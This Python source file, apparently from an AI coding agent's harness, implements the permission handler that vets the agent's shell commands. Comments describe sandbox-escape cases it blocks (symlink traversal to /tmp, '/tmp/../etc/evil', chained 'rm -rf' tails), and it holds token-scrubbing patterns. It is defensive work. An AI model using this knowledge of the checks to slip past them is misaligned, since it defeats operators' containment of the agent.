    """POSIX shell word-split of a segment (quotes removed the way bash would),
    or ``None`` on a tokenization error (unbalanced quotes) so the caller fails
    closed. Using shlex — not ``str.split`` — is load-bearing: a quoted operand
    with spaces (`cp src "esc/a grep b"`) must yield the real path `esc/a grep b`,
    not the fragments `"esc/a` / `b"`, or the symlink/control-plane component is
    never seen."""
    try:
        return shlex.split(seg)
    except ValueError:
        return None


def _extract_cp_mv_destination(seg: str) -> list[str] | None:
    """Destination operand of a `cp`/`mv` segment (the write target).

    The `bash-cp-mv` YAML rule already rejects any `..`/absolute/`~`/`$` operand,
    so an allowed segment has only relative operands. The destination is the
    `-t`/`--target-directory` value when present, else the last positional
    operand. Returns ``None`` (fail-closed) when no destination is parseable.
    """
    tokens = _shlex_operands(seg)
    if tokens is None or len(tokens) < 3:  # need command + >= 1 source + dest
        return None
    rest = tokens[1:]
    for i, tok in enumerate(rest):
        # `-t DIR` and the GNU combined short-flag forms (`-rt DIR`, `-vt DIR`,
        # …) put the TARGET DIRECTORY in the next token and make every positional
        # a source — so the real write destination is `<DIR>/<src>`, NOT the last
        # positional. Missing this validates a benign source operand while bytes
        # land in an unchecked (possibly escaping or control-plane) directory.
        # A short cluster ending in `t` means `-t` is its last, arg-taking flag.
        if (tok == "--target-directory" or _CP_MV_TARGET_FLAG_RE.fullmatch(tok)) and i + 1 < len(rest):
            return [rest[i + 1]]
        if tok.startswith("--target-directory="):
            return [tok.split("=", 1)[1]]
    non_flags = [t for t in rest if not t.startswith("-")]
    if len(non_flags) < 2:  # need >= 1 source + destination
        return None
    return [non_flags[-1]]


def _extract_mkdir_destinations(seg: str) -> list[str] | None:
    """Every directory operand of a `mkdir` segment (each is created).

    A space-separated option value (e.g. ``-m 755``) survives as a pseudo-operand,
    which is harmless: it resolves in-worktree and is not control-plane, so it
    never produces a false deny while the real target(s) are still validated.
    """
    tokens = _shlex_operands(seg)
    if tokens is None or len(tokens) < 2:
        return None
    dests = [t for t in tokens[1:] if not t.startswith("-")]
    return dests or None


def _extract_write_destinations(kind: str, seg: str) -> list[str] | None:
    """Destination operand(s) for a write-capable segment, or ``None`` to fail
    closed when the destination cannot be parsed. ``kind`` is the structural
    write-kind from ``_segment_write_kind``, never a policy rule_id."""
    if kind == "bash-git-show-redirect":
        m = _GIT_SHOW_REDIRECT_DEST_RE.search(seg)
        return [m.group(1)] if m else None
    if kind == "bash-cp-mv":
        return _extract_cp_mv_destination(seg)
    if kind == "bash-mkdir":
        return _extract_mkdir_destinations(seg)
    return None


def _is_control_plane_path(dest: str, cwd: str) -> bool:
    """Whether ``dest`` (resolved against the worktree ``cwd``) lands on the
    agent's control plane (cpp#42). Operates on the canonical worktree-relative
    path so a symlink resolving INTO the control plane is still caught. Returns
    ``False`` for paths outside the worktree — containment owns that verdict."""
    try:
        resolved_cwd = Path(cwd).resolve(strict=True)
    except OSError:
        return False
    abs_path = (
        Path(dest).resolve(strict=False)
        if Path(dest).is_absolute()
        else (resolved_cwd / dest).resolve(strict=False)
    )
    try:
        rel = abs_path.relative_to(resolved_cwd).as_posix()
    except ValueError:
        return False
    return any(pat.match(rel) for pat in _CONTROL_PLANE_PATTERNS)


# ── Sanctioned /tmp scratch directory for `mkdir` (cpp#143) ────────────────────
#
# `_destination_veto_reason` (below) is otherwise blind to any distinction
# between "outside the worktree" and "outside the worktree, AND outside every
# other sanctioned location" — it has exactly one sanctioned exception already,
# and this is the second. `_is_sanctioned_pure_heredoc` /
# `bash-cat-heredoc-tmp` (`:322-348` above) already let a pilot write a FILE
# under `/tmp` with no containment veto at all: `cat` is not a write-kind
# `_segment_write_kind` classifies, so a heredoc's `/tmp` destination never
# reaches this function in the first place. `mkdir` IS classified
# (`_segment_write_kind` returns `"bash-mkdir"`), so before this fix the exact
# same boundary — a scratch path under `/tmp`, outside the worktree by
# construction — was vetoed AND terminal for a directory while being routine
# for a file. cpp#143's session `0160cce6` died on `mkdir -p
# /tmp/rt005-empty-nobatch /tmp/rt005-empty-runs/runs`: ordinary test-fixture
# scaffolding for empty/missing-directory cases, exactly the shape a worktree
# (visible to `git status`) is the wrong place to build.
#
# The fix restores the SAME symmetry the heredoc already has, using the SAME
# MECHANISM the heredoc uses — not merely the same target. `_is_sanctioned_
# pure_heredoc` never touches the filesystem: it is a pure LEXICAL check on
# the command string (`_SANCTIONED_HEREDOC_OPENER_RE`, `/tmp/(?!.*\.\.)
# [\w./-]+`) with no `Path.resolve()`, no symlink following. This function
# mirrors that exactly, and that choice is load-bearing, not cosmetic: an
# EARLIER version of this fix resolved the destination via `Path.resolve()`
# (following symlinks, same as `is_within_project`) before checking `/tmp`
# membership — and broke the cpp#38 symlink-escape tests, because a worktree
# symlink crafted to resolve INTO `/tmp` (`esc -> ../../../tmp`, then `mkdir
# esc/x`) would resolve to a `/tmp` path and get exempted, even though the
# pilot never wrote `/tmp` anywhere in the command. Matching on the LITERAL
# operand text closes that: `_extract_mkdir_destinations` already returns the
# raw, un-resolved shlex token, so a symlinked or otherwise indirect route to
# `/tmp` simply does not match this pattern and falls straight through to the
# ordinary containment veto below (cpp#38 unchanged, still catches it).
#
#   * The operand must LITERALLY start with `/tmp/`, contain no `..`
#     anywhere (mirrors the heredoc's own `(?!.*\.\.)`, so `mkdir -p
#     /tmp/../etc/evil` is rejected by the pattern itself — no resolve needed
#     to catch it), and use the same restricted charset (`[\w./-]+`, no
#     shell metacharacters — moot here since the operand already passed
#     `shlex`, but kept identical to the heredoc's for one mental model).
#   * Scoped to `mkdir` ONLY (`_segment_write_kind == "bash-mkdir"`) — `cp`/
#     `mv`/`git show >` into `/tmp` are unaffected and still vetoed exactly as
#     before. Symmetric with the heredoc exception (a `cat`-only carve-out) in
#     spirit, but not merged into it: two structurally different call sites,
#     matched independently, so neither can be widened by editing the other.
_TMP_SCRATCH_MKDIR_RE = re.compile(r"^/tmp/(?!.*\.\.)[\w./-]+$")


def _is_sanctioned_tmp_scratch(dest: str) -> bool:
    """Whether an (already `mkdir`-classified) raw destination operand is the
    sanctioned ``/tmp`` scratch exception (cpp#143).

    Purely lexical — no filesystem access, no symlink resolution — matching
    ``_is_sanctioned_pure_heredoc``'s own mechanism exactly. ``dest`` must be
    the LITERAL, un-resolved operand (what ``_extract_mkdir_destinations``
    returns): only a command that itself spells ``/tmp/...`` qualifies, so a
    symlink or relative path that merely *resolves into* ``/tmp`` does not —
    it is still caught by the ordinary containment veto below (cpp#38).
    """
    return bool(dest) and _TMP_SCRATCH_MKDIR_RE.match(dest) is not None


def _destination_veto_reason(command: str, cwd: str) -> str | None:
    """Veto reason if any write-capable segment's destination escapes the
    worktree (cpp#38) or lands on the agent control plane (cpp#42); else ``None``.

    Per-segment so a compound like ``mkdir a && cp s esc/x`` validates each write
    target independently. Each segment is classified STRUCTURALLY by its leading
    command word (``_segment_write_kind``) — never by a shadowable policy rule_id.
    Order is load-bearing: SANCTIONED-SCRATCH first (cpp#143, `mkdir` under
    `/tmp` only — see the block above), then CONTAINMENT (the safety boundary),
    then CONTROL-PLANE (layered policy on an already-contained path).
    Unparseable destinations fail closed (vetoed). The caller has already
    established the whole command as allow + chain-safe, so this only decides
    where the write lands.
    """
    if not isinstance(command, str) or not command:
        return None
    for seg in _split_compound_command(command):
        kind = _segment_write_kind(seg)
        if kind is None:
            continue
        dests = _extract_write_destinations(kind, seg)
        if not dests:
            return (
                f"write-capable segment ({kind}) destination could not be "
                "parsed — denied fail-closed"
            )
        for dest in dests:
            if kind == "bash-mkdir" and _is_sanctioned_tmp_scratch(dest):
                continue
            if not is_within_project(dest, cwd):
                return (
                    f"destination {dest!r} resolves outside the worktree "
                    "(cpp#38 symlink-traversal containment)"
                )
            if _is_control_plane_path(dest, cwd):
                return (
                    f"destination {dest!r} is on the agent control plane "
                    "(cpp#42 denylist)"
                )
    return None


def _fire_notify(tool_name: str, detail: str, reason: str) -> None:
    """Best-effort operator notification on deny-with-notify via ``mika notify``.

    Wire-format keeps the legacy ``escalate`` decision string for back-compat
    with existing operator-authored permissions.yaml overlays; the runtime
    semantics post-cpp#20 joint 2 are deny-with-notify (no relay roundtrip,
    pilot loop halts via ``interrupt=True``). cpp#128 left this path terminal:
    an escalate exists to put a human in the loop.
    """
    from .notify import notify_escalation

    notify_escalation(f"{tool_name}: {detail}: {reason}")


def _record_decision(
    result: PermissionResult,
    *,
    tool_name: str,
    rule_id: str,
    cwd: str,
    ctx: ToolPermissionContext,
) -> PermissionResult:
    """Fire the cm#99 permission-event side-channel and return ``result``.

    Wraps every terminal return in :func:`create_permission_handler` so cm
    observes an event for each allow / deny (AC1) with the classifier rule
    that produced it. The emitter is fail-OPEN and non-blocking
    (:mod:`permission_events` — bounded queue, background worker), so this
    call is a bounded-cost no-op on the classifier's critical path even when
    cm is unreachable (AC2).

    A ``PermissionResultAllow`` maps to wire ``"allow"``; a
    ``PermissionResultDeny`` maps to wire ``"deny"``. AskUserQuestion answers
    are structurally ``PermissionResultAllow`` (they carry the answers dict
    as ``updated_input``) and therefore emit as ``allow``.
    """
    decision = "allow" if isinstance(result, PermissionResultAllow) else "deny"
    permission_events.emit(
        tool_name=tool_name,
        decision=decision,
        rule_id=rule_id,
        cwd=cwd,
        tool_use_id=ctx.tool_use_id or "",
        agent_id=ctx.agent_id,
    )
    return result


def create_permission_handler(
    *,
    config: PilotConfig | None,
    relay: bool,
    verbose: bool,
    cwd: str,
    guardrails: SessionGuardrails | None = None,
    task_id: str | None = None,
    policy_path: Path | None = None,
    interactive: bool = False,
) -> CanUseTool:
    """Build the ``can_use_tool`` callback (Tier 1 → Tier 1.5 → policy → relay
    → interactive fallback).

    ``interactive`` (cpp#69) opts into the operator-driven shell posture. When
    ``True`` *and* stdin is a TTY, a **default** deny — the policy's fail-closed
    "no rule matched, unknown request" verdict (``rule_id is None``) — is
    surfaced to the live operator through the existing interactive fallback
    (:func:`_interactive_fallback`) instead of being auto-refused. Post-cpp#128
    the distinguishing property is "the operator gets a say", not "avoids a
    halt" — a headless default-deny of an ordinary command no longer halts
    either. This
    reuses the one interactive path already in this module; it never adds a
    second permission path, and it never overrides an EXPLICIT decision: rule-
    based denies, deny-with-notify, and the allow-branch safety vetoes
    (chain-danger, destination-escape / control-plane) all stay hard denies the
    operator cannot wave through. Left ``False`` (the default), every existing
    caller — the headless pilot included — keeps its exact behavior.
    """
    # Load policy once at handler creation time (cached for session).
    policy = load_policy(policy_path)
    policy_enabled = os.environ.get("MIKA_PILOT_POLICY_DISABLED", "").strip() != "1"

    # Per-spawn permission-policy mode (mika#1708). Cached at handler creation
    # so a mid-session env-var flip does not race — a rollback flip takes
    # effect on the next dispatch's handler, not mid-session.
    perm_mode = _resolve_perm_mode()
    per_spawn_policy = _load_per_spawn_policy() if perm_mode == PERM_MODE_PER_SPAWN else {}
    audit.emit(
        "perm_policy_mode",
        {
            "mode": perm_mode,
            "policy_size": len(per_spawn_policy) if perm_mode == PERM_MODE_PER_SPAWN else None,
            "task_id": task_id,
        },
    )

    async def handler(
        tool_name: str,
        tool_input: dict[str, Any],
        ctx: ToolPermissionContext,
    ) -> PermissionResult:
        log_tool_request(tool_name, _summarize_input(tool_name, tool_input))

        # Per-spawn Bash evaluator (mika#1708). When enabled, this REPLACES
        # tier1's ``is_safe_bash_command`` for Bash tools only. On allow,
        # skip straight to the Allow return. On deny, emit a rollback audit
        # event and fall through to the classic Tier 2 policy / relay path
        # so the classic evaluator has a chance to weigh in (defense in
        # depth during Phase 1 opt-in — see plan doc).
        if perm_mode == PERM_MODE_PER_SPAWN and tool_name == "Bash":
            command = tool_input.get("command", "")
            if isinstance(command, str) and command.strip():
                ps_result = per_spawn.evaluate(
                    command, initial_cwd=cwd, policy=per_spawn_policy
                )
                if ps_result.allowed:
                    log_tool(
                        tool_name,
                        _summarize_input(tool_name, tool_input),
                        "AUTO",
                    )
                    return _record_decision(
                        PermissionResultAllow(updated_input=tool_input),
                        tool_name=tool_name,
                        rule_id="per-spawn-allow",
                        cwd=cwd,
                        ctx=ctx,
                    )
                audit.emit(
                    "perm_policy_rollback",
                    {
                        "mode": perm_mode,
                        "reason": ps_result.reason,
                        "command_head": command[:120],
                        "spawn_count": len(ps_result.spawns),
                        "task_id": task_id,
                    },
                )
                # Fall through to classic evaluators — they may still allow.

        # Tier 1 fast path
        if is_tier1_auto_approve(tool_name, tool_input, cwd):
            log_tool(tool_name, _summarize_input(tool_name, tool_input), "AUTO")
            return _record_decision(
                PermissionResultAllow(updated_input=tool_input),
                tool_name=tool_name,
                rule_id="tier1-auto-approve",
                cwd=cwd,
                ctx=ctx,
            )

        # Tier 1.5 fast path — deterministic auto-answer (compact-safe)
        auto_answer = try_tier_1_5_auto_answer(tool_name, tool_input)
        if auto_answer is not None:
            log_tool(tool_name, _summarize_input(tool_name, tool_input), "AUTO")
            return _record_decision(
                _map_response(tool_name, tool_input, auto_answer),
                tool_name=tool_name,
                rule_id="tier1.5-auto-answer",
                cwd=cwd,
                ctx=ctx,
            )

        # Tier 2: deterministic policy-file lookup (mika#1192).
        #
        # Denial lethality is decided by `_denial_is_terminal` (cpp#128): a
        # refusal is ALWAYS a refusal — the command is never executed and the
        # audit event fires either way — but only a tier3-dangerous Bash command
        # or a destination veto also aborts the SDK agent loop. Every other
        # refusal comes back to the model as a `tool_result` error it can adapt
        # to. See the doctrine block above `_denial_is_terminal` for the
        # measurement that forced this split and for why cpp#20 joint 2's
        # fabrication counter-reason is carried by the session guardrails
        # instead. When a denial IS terminal, downstream parsers (mika
        # dispatch-lib `_run_claude_pilot`) still see a clean terminal ResultJson
        # with status != "success" via the synthetic-emit guard in agent.py.
        if policy_enabled:
            pd = evaluate(policy, tool_name, tool_input)
            detail = _summarize_input(tool_name, tool_input)
            if pd.decision == "allow":
                # Chained-danger guard (claude-pilot#25): a policy allow rule
                # matches a whole-command regex; veto it if a dangerous tail is
                # chained onto the allowed prefix. The veto stands either way —
                # the command is never executed. Whether it also ends the run is
                # `_denial_is_terminal`'s call (cpp#128): a genuinely dangerous
                # tail (`mkdir x && rm -rf /tmp/y`) is caught by the whole-string
                # tier3 search and halts; a merely un-allowlisted segment
                # (`echo "label"; cmd`, `for … do … done`) is refused and the run
                # continues.
                if not _bash_allow_is_chain_safe(policy, tool_name, tool_input):
                    veto_reason = (
                        f"policy allow ({pd.rule_id}) vetoed — command chains a "
                        "tier3-dangerous or command-substitution tail onto the "
                        "allowed prefix"
                    )
                    log_policy_deny(tool_name, detail, pd.rule_id)
                    return _record_decision(
                        PermissionResultDeny(
                            message=veto_reason,
                            interrupt=_denial_is_terminal(tool_name, tool_input, cwd),
                        ),
                        tool_name=tool_name,
                        rule_id=f"{pd.rule_id}:chain-veto",
                        cwd=cwd,
                        ctx=ctx,
                    )
                # Destination validation for write-capable structural rules:
                # worktree containment (cpp#38) + control-plane denylist (cpp#42).
                # Runs here because it needs the worktree root (`cwd`), which the
                # string-only policy guard does not carry.
                #
                # THE EXCEPTION (cpp#128): this is the one denial class that
                # keeps an unconditional `interrupt=True`. It does not consult
                # `_denial_is_terminal`. A destination veto means the pilot tried
                # to write OUTSIDE its own worktree or into the control plane —
                # a containment breach, not a refused idiom. There is nothing for
                # the model to usefully adapt to, and letting the run continue
                # past one would keep a session alive that has already left its
                # sandbox in intent. It halts.
                if tool_name == "Bash":
                    dest_veto = _destination_veto_reason(
                        tool_input.get("command", ""), cwd
                    )
                    if dest_veto is not None:
                        log_policy_deny(tool_name, detail, pd.rule_id)
                        return _record_decision(
                            PermissionResultDeny(message=dest_veto, interrupt=True),
                            tool_name=tool_name,
                            rule_id=f"{pd.rule_id}:destination-veto",
                            cwd=cwd,
                            ctx=ctx,
                        )
                log_policy_allow(tool_name, detail, pd.rule_id)
                return _record_decision(
                    PermissionResultAllow(updated_input=tool_input),
                    tool_name=tool_name,
                    rule_id=pd.rule_id or "policy-default",
                    cwd=cwd,
                    ctx=ctx,
                )
            if pd.decision == "deny":
                # cpp#69 interactive shell: when an operator is live-driving at
                # a TTY, surface a DEFAULT deny (rule_id is None — no rule
                # matched, the "unknown, ask a human" case) to them via the
                # existing interactive fallback rather than auto-refusing.
                # Explicit rule-based denies (rule_id set) are never
                # handed to the operator — they stand as refusals, and halt only
                # when `_denial_is_terminal` says so (cpp#128).
                # TTY-gated so a piped / non-interactive shell keeps the
                # fail-closed default-deny posture.
                if interactive and pd.rule_id is None and sys.stdin.isatty():
                    fb_result = await _interactive_fallback(tool_name, tool_input)
                    return _record_decision(
                        fb_result,
                        tool_name=tool_name,
                        rule_id="interactive-operator",
                        cwd=cwd,
                        ctx=ctx,
                    )
                log_policy_deny(tool_name, detail, pd.rule_id)
                return _record_decision(
                    PermissionResultDeny(
                        message=pd.reason,
                        interrupt=_denial_is_terminal(tool_name, tool_input, cwd),
                    ),
                    tool_name=tool_name,
                    rule_id=pd.rule_id or "policy-default",
                    cwd=cwd,
                    ctx=ctx,
                )
            # Wire-format `escalate` = deny-with-notify: best-effort operator
            # notify + halt the pilot loop. Wire keyword preserved for
            # back-compat with existing operator overlays; runtime semantics
            # post-cpp#20 joint 2 are identical to `deny` plus the notify
            # side-effect (cpp#21 rename is source-only).
            #
            # UNCHANGED by cpp#128, deliberately. `escalate` means "put a human
            # in the loop", so continuing past it defeats its only purpose, and
            # it is outside the class cpp#128 measured (all 11 killed sessions
            # logged `[policy:deny]`, none `[policy:deny_with_notify]`). It also
            # has no dedup or rate limit — `_fire_notify` spawns a detached
            # `mika notify` per call — so making it non-terminal would turn a
            # retry loop into an operator-notification flood on the very channel
            # that compensates for non-lethal denials elsewhere.
            log_policy_deny_with_notify(tool_name, detail, pd.rule_id)
            _fire_notify(tool_name, detail, pd.reason)
            return _record_decision(
                PermissionResultDeny(message=pd.reason, interrupt=True),
                tool_name=tool_name,
                rule_id=pd.rule_id or "policy-default",
                cwd=cwd,
                ctx=ctx,
            )

        # TODO(mika#1193 Phase C): remove relay block below once policy has soaked >= 7 days.
        # The relay path is only reachable when MIKA_PILOT_POLICY_DISABLED=1 (emergency rollback).

        # No relay → interactive fallback
        if not relay or config is None:
            fb_result = await _interactive_fallback(tool_name, tool_input)
            return _record_decision(
                fb_result,
                tool_name=tool_name,
                rule_id="interactive-fallback",
                cwd=cwd,
                ctx=ctx,
            )

        event = PilotEvent(
            type="question" if tool_name == "AskUserQuestion" else "permission",
            tool_name=tool_name,
            tool_input=tool_input,
            tool_use_id=ctx.tool_use_id or "",
            agent_id=ctx.agent_id,
            # cpp#56: additive ToolPermissionContext enrichment. getattr-guarded
            # so an SDK minor lacking a field yields None instead of crashing.
            decision_reason=getattr(ctx, "decision_reason", None),
            blocked_path=getattr(ctx, "blocked_path", None),
            title=getattr(ctx, "title", None),
            display_name=getattr(ctx, "display_name", None),
            description=getattr(ctx, "description", None),
        )

        log_relay_send(tool_name)
        if guardrails is not None:
            guardrails.pause_idle_timer()

        try:
            start = time.monotonic()
            try:
                response = await invoke_command(config, event, verbose, task_id)
                latency_ms = int((time.monotonic() - start) * 1000)
                log_relay_recv(tool_name, response.action, latency_ms)
                return _record_decision(
                    _map_response(tool_name, tool_input, response),
                    tool_name=tool_name,
                    rule_id=f"relay-{response.action}",
                    cwd=cwd,
                    ctx=ctx,
                )
            except TransportError as err:
                latency_ms = int((time.monotonic() - start) * 1000)
                log_relay_recv(tool_name, "error", latency_ms)
                log_retry(f"{err} — retrying with error feedback")

                retry_event = event.model_copy(
                    update={
                        "error": (
                            f"Previous response was malformed: {err}. "
                            'Expected JSON: {"action": "allow"} or {"action": "deny"} '
                            'or {"action": "answer", "answers": {"question": "answer"}}'
                        )
                    }
                )

                start = time.monotonic()
                try:
                    response = await invoke_command(config, retry_event, verbose, task_id)
                    latency_ms = int((time.monotonic() - start) * 1000)
                    log_relay_recv(tool_name, response.action, latency_ms)
                    # cpp#111 D8-2 Transition 3: tool-call recovery. Fires
                    # only when the bounded retry succeeded — the first-try
                    # TransportError was recovered without escalating to the
                    # interactive fallback. Fire-and-forget; a cm outage
                    # never masks the successful recovery.
                    emit_heartbeat(
                        "recovery:tool",
                        meta={"tool": tool_name, "action": response.action},
                    )
                    return _record_decision(
                        _map_response(tool_name, tool_input, response),
                        tool_name=tool_name,
                        rule_id=f"relay-retry-{response.action}",
                        cwd=cwd,
                        ctx=ctx,
                    )
                except TransportError as retry_err:
                    latency_ms = int((time.monotonic() - start) * 1000)
                    log_relay_recv(tool_name, "error", latency_ms)
                    log_fallback(str(retry_err))
                    fb_result = await _interactive_fallback(tool_name, tool_input)
                    return _record_decision(
                        fb_result,
                        tool_name=tool_name,
                        rule_id="relay-fallback-interactive",
                        cwd=cwd,
                        ctx=ctx,
                    )
        finally:
            if guardrails is not None:
                guardrails.resume_idle_timer()

    return handler


def _map_response(
    tool_name: str,
    original_input: dict[str, Any],
    response: PilotResponse,
) -> PermissionResult:
    if isinstance(response, PilotResponseAllow):
        log_tool(tool_name, _summarize_input(tool_name, original_input), "ALLOW")
        return PermissionResultAllow(updated_input=original_input)

    if isinstance(response, PilotResponseDeny):
        log_denied(tool_name, _summarize_input(tool_name, original_input))
        return PermissionResultDeny(
            message=response.message or "Denied by external agent",
            interrupt=False,
        )

    assert isinstance(response, PilotResponseAnswer)
    first_q = next(iter(response.answers.keys()), "")
    first_a = next(iter(response.answers.values()), "")
    log_question(first_q, first_a)
    return PermissionResultAllow(
        updated_input={
            "questions": original_input.get("questions"),
            "answers": response.answers,
        }
    )


# ── Tier 1.5: deterministic compact-safe auto-answer ─────────────────────────
#
# Mirrors mika/skills/bundled/permission-policy/system_prompt.md TIER 1.5
# (lines 31-32): /ce:compound Phase 0 prompts choose between "full compound"
# and "compact-safe"; headless sessions always pick "compact-safe" (see #79).
# Ported into claude-pilot as a deterministic short-circuit so the LLM-backed
# relay is never invoked for this class of question (mika#1191 Phase A).

_COMPACT_SAFE_RE = re.compile(r"\bcompact-safe\b", re.IGNORECASE)


def try_tier_1_5_auto_answer(
    tool_name: str,
    tool_input: dict[str, Any],
) -> PilotResponseAnswer | None:
    """Auto-answer compact-safe compaction-mode questions without relay.

    Returns a `PilotResponseAnswer` selecting "compact-safe" when EVERY
    question in the tool_input contains the case-insensitive substring
    `"compact-safe"`. Returns `None` for any other tool call or any
    AskUserQuestion that includes a non-matching sibling question — those
    fall through to the relay for normal handling.
    """
    if tool_name != "AskUserQuestion":
        return None

    questions = tool_input.get("questions")
    if not isinstance(questions, list) or not questions:
        return None

    answers: dict[str, str] = {}
    for q in questions:
        if not isinstance(q, dict):
            return None
        question_text = q.get("question", "")
        if not isinstance(question_text, str) or not _COMPACT_SAFE_RE.search(question_text):
            return None
        answers[question_text] = "compact-safe"

    return PilotResponseAnswer(action="answer", answers=answers)


async def _interactive_fallback(
    tool_name: str,
    tool_input: dict[str, Any],
) -> PermissionResult:
    """Prompt the operator on stderr for a permission or question decision.

    Entry point for both interactive fallback call sites in
    :func:`create_permission_handler`: the "no relay" branch and the
    "relay-exhausted after retry" branch — plus the cpp#69 operator-shell
    default-deny branch (``interactive=True``). Reachability caveat for the
    first two: in the default headless posture (policy enabled, non-interactive)
    the Tier 2 policy block above always returns terminally, so neither of those
    two call sites is exercised — see ``docs/permissions-interactive-fallback.md``.

    TTY-gates on ``sys.stdin.isatty()`` — a non-TTY session (subprocess pipe,
    systemd, CI) auto-denies with ``interrupt=False`` so the SDK surfaces the
    denial to the LLM as a tool_result rather than aborting the loop. Since
    cpp#128 the Tier 2 policy path shares that default; it reserves
    ``interrupt=True`` for a destination veto or a tier3-dangerous Bash command
    (:func:`_denial_is_terminal`).

    Routes ``AskUserQuestion`` to :func:`_interactive_question`; every other
    tool routes to :func:`_interactive_permission`.
    """
    if not sys.stdin.isatty():
        log_denied(tool_name, "non-interactive mode — auto-denied")
        return PermissionResultDeny(
            message="Non-interactive mode: auto-denied", interrupt=False
        )

    if tool_name == "AskUserQuestion":
        return await _interactive_question(tool_input)
    return await _interactive_permission(tool_name, tool_input)


async def _interactive_permission(
    tool_name: str,
    tool_input: dict[str, Any],
) -> PermissionResult:
    """Prompt ``Allow? (y/n):`` on stderr for a non-question tool.

    Allow rule is deliberately permissive: any input whose stripped-lowercase
    form STARTS WITH ``"y"`` maps to Allow — ``y``, ``Y``, ``yes``, ``yep``,
    ``yolo`` all pass. Anything else (``n``, empty, ``no``, whitespace-only,
    garbage) maps to Deny with the literal message ``"Denied by user"``.
    Denial uses ``interrupt=False`` — see :func:`_interactive_fallback`.

    No other affordances: no allow-with-modifications, no deny-with-reason,
    no defer-to-relay. cpp#69 makes this path reachable from the operator shell
    (``create_permission_handler(interactive=True)`` routes a policy default-deny
    here); richer affordances remain future work.
    """
    detail = _summarize_input(tool_name, tool_input)
    log_escalate(tool_name, detail)
    answer = await _ainput("  Allow? (y/n): ")
    if answer.strip().lower().startswith("y"):
        log_tool(tool_name, detail, "ALLOW")
        return PermissionResultAllow(updated_input=tool_input)
    log_denied(tool_name, detail)
    return PermissionResultDeny(message="Denied by user", interrupt=False)


async def _interactive_question(tool_input: dict[str, Any]) -> PermissionResult:
    """Prompt the operator on stderr for an ``AskUserQuestion`` tool call.

    For each question in ``tool_input["questions"]``: renders the question,
    lists numbered options (when ``q["options"]`` is a list), then reads one
    line. Integer input in ``[1, len(options)]`` selects the labeled option
    verbatim; anything else — non-integer, out-of-range, empty — is taken as
    a free-text answer. Questions without ``options`` are always free-text.
    ``AskUserQuestion`` never denies through this path; the only Deny return
    is the malformed-input guard below.

    Answers are keyed by question text and returned as
    ``PermissionResultAllow(updated_input={"questions": ..., "answers": ...})``,
    matching the SDK's expected shape for :class:`AskUserQuestion`.
    """
    questions = tool_input.get("questions")
    if not isinstance(questions, list):
        return PermissionResultDeny(
            message="Malformed AskUserQuestion: missing questions array",
            interrupt=False,
        )

    answers: dict[str, str] = {}
    for q in questions:
        if not isinstance(q, dict):
            continue
        question = str(q.get("question", ""))
        options = q.get("options") if isinstance(q.get("options"), list) else None
        log_question_escalate(question)
        if options:
            for i, opt in enumerate(options, start=1):
                label = opt.get("label", "") if isinstance(opt, dict) else str(opt)
                sys.stderr.write(f"  {i}. {label}\n")
            raw = (await _ainput("\n  Your answer: ")).strip()
            try:
                idx = int(raw)
                if 1 <= idx <= len(options):
                    opt = options[idx - 1]
                    answers[question] = opt.get("label", "") if isinstance(opt, dict) else str(opt)
                    continue
            except ValueError:
                pass
            answers[question] = raw
        else:
            answers[question] = (await _ainput("\n  Your answer: ")).strip()

    first_q = questions[0].get("question", "") if isinstance(questions[0], dict) else ""
    first_a = next(iter(answers.values()), "")
    log_question(first_q, first_a)
    return PermissionResultAllow(
        updated_input={"questions": questions, "answers": answers}
    )


async def _ainput(prompt: str) -> str:
    """Async-safe blocking stdin readline paired with a stderr prompt.

    Bridges synchronous ``sys.stdin.readline`` into the asyncio event loop by
    dispatching the blocking call to the default thread executor. The event
    loop stays responsive (guardrail watchdogs, background emitters keep
    firing), but the SDK's ``can_use_tool`` callback that awaited this
    function is held until the operator hits enter — so the Claude session
    itself is blocked at the tool boundary, same shape as a slow relay.

    ``prompt`` is written directly to ``sys.stderr`` and NOT routed through
    :func:`claude_pilot.logger.write_log`, so under ``--log-dir`` the prompt
    text does not reach the file sink. Escalation logs above the prompt
    still do. See ``docs/permissions-interactive-fallback.md``.

    No timeout. A stuck ``readline`` returns only on newline, EOF, or a
    signal that unwinds the executor (SIGINT via the CLI's signal handler).
    """
    import asyncio

    sys.stderr.write(prompt)
    sys.stderr.flush()
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, sys.stdin.readline)


# ── Input summarizers (shared with relay payloads) ──────────────────────────

_BEARER_RE = re.compile(r"(Bearer\s+)\S+", re.IGNORECASE)
_SK_ANT_RE = re.compile(r"(sk-ant-\S{0,6})\S*")
_GHP_RE = re.compile(r"(ghp_\S{0,4})\S*")
_XOXB_RE = re.compile(r"(xoxb-\S{0,4})\S*")
_KV_SECRET_RE = re.compile(r"(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|API_KEY)=\S+", re.IGNORECASE)


def _scrub_secrets(text: str) -> str:
    text = _BEARER_RE.sub(r"\1[REDACTED]", text)
    text = _SK_ANT_RE.sub(r"\1...[REDACTED]", text)
    text = _GHP_RE.sub(r"\1...[REDACTED]", text)
    text = _XOXB_RE.sub(r"\1...[REDACTED]", text)
    text = _KV_SECRET_RE.sub(r"\1=[REDACTED]", text)
    return text


def _summarize_input(tool_name: str, tool_input: dict[str, Any]) -> str:
    if tool_name == "Bash":
        return _scrub_secrets(str(tool_input.get("command", ""))[:200])
    if tool_name in ("Write", "Edit", "Read"):
        return str(tool_input.get("file_path", ""))
    if tool_name in ("Glob", "Grep"):
        return str(tool_input.get("pattern", ""))
    if tool_name == "Skill":
        skill = str(tool_input.get("skill", "unknown"))
        args = tool_input.get("args")
        suffix = f" {_scrub_secrets(str(args)[:100])}" if args else ""
        return f"{skill}{suffix}"
    return _scrub_secrets(json.dumps(tool_input, default=str)[:150])
